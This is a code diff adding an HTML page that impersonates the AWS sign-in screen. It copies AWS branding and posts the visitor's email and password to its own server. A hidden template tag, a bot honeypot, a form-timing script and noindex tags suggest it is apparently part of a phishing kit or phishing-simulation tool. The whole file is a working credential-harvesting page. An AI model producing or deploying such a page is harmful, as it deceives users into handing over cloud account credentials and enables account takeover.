@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>AWS Sign-In</title>
+<meta name="theme-color" content="#FF9900">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23FF9900%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EA%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23FF9900%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EA%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="AWS Sign-In">
+<meta property="og:site_name" content="AWS">
+<style>
+  body { margin:0;min-height:100vh;background:#fff;color:#111;
+         font-family:'Amazon Ember',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,
+                     Helvetica,Arial,sans-serif;display:flex;justify-content:center;
+         padding:18px 16px 40px; }
+  .col { width:100%;max-width:350px; }
+  .mark { display:flex;justify-content:center;margin:0 0 18px; }
+  .card { border:1px solid #ddd;border-radius:8px;padding:20px 26px 26px;box-sizing:border-box; }
+  h1 { font-size:28px;font-weight:400;margin:0 0 14px; }
+  .field { margin-bottom:14px; }
+  .field label { display:block;font-size:13px;font-weight:700;margin:0 0 4px; }
+  .field input { width:100%;padding:8px 10px;font-size:15px;border:1px solid #a6a6a6;
+                 border-radius:4px;outline:none;box-sizing:border-box; }
+  .field input:focus { border-color:#FF9900;box-shadow:0 0 0 3px #c8f3fa; }
+  .btn { width:100%;padding:9px;font-size:14px;font-weight:500;color:#111;
+         background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;
+         border-radius:8px;cursor:pointer;margin-top:6px; }
+  .btn:hover { background:linear-gradient(to bottom,#f5d78e,#eeb933); }
+  .legal { font-size:12px;color:#111;line-height:1.5;margin:14px 0 0; }
+  .legal a { color:#0066c0;text-decoration:none; }
+  .newto { font-size:12px;color:#767676;text-align:center;margin:22px 0 6px;
+           border-top:1px solid #e7e7e7;padding-top:14px; }
+  .create { display:block;text-align:center;font-size:13px;padding:8px;border:1px solid
+            #adb1b8;border-radius:8px;color:#111;text-decoration:none;
+            background:linear-gradient(to bottom,#f7f8fa,#e7e9ec); }
+  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
+</style>
+</head>
+<body>
+<div class="col">
+  <div class="mark"><svg viewBox="0 0 60 40" width="60" height="40" role="img" aria-label="AWS"><text x="0" y="30" font-family="Arial,Helvetica,sans-serif" font-size="30" font-weight="700" fill="#FF9900" letter-spacing="-0.5">AWS</text></svg></div>
+  <form class="card" method="POST" action="/">
+    <h1>Sign in</h1>
+    <div class="field">
+      <label for="email">Email</label>
+      <input id="email" name="email" type="email" placeholder="you@example.com" autocomplete="username" required>
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
+    </div>
+    <button class="btn" type="submit">Continue</button>
+    <p class="legal">By continuing, you agree to AWS's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
+
+  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
+  <input type="hidden" name="_tpl" value="aws">
+  <input type="hidden" name="_ts" value="__TS__">
+
+<script>
+/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
+   record it, and we log how long the form was open (bot forms are instant). */
+(function(){
+  var t0 = Date.now();
+  var f = document.querySelector('form');
+  if(!f) return;
+  f.addEventListener('submit', function(){
+    var el = f.querySelector('input[name=_ts]');
+    if(el) el.value = String(Date.now() - t0);
+  });
+})();
+</script>
+    <div class="newto">New to AWS?</div>
+    <a class="create" href="#">Create your AWS account</a>
+  </form>
+</div>
+</body>
+</html>
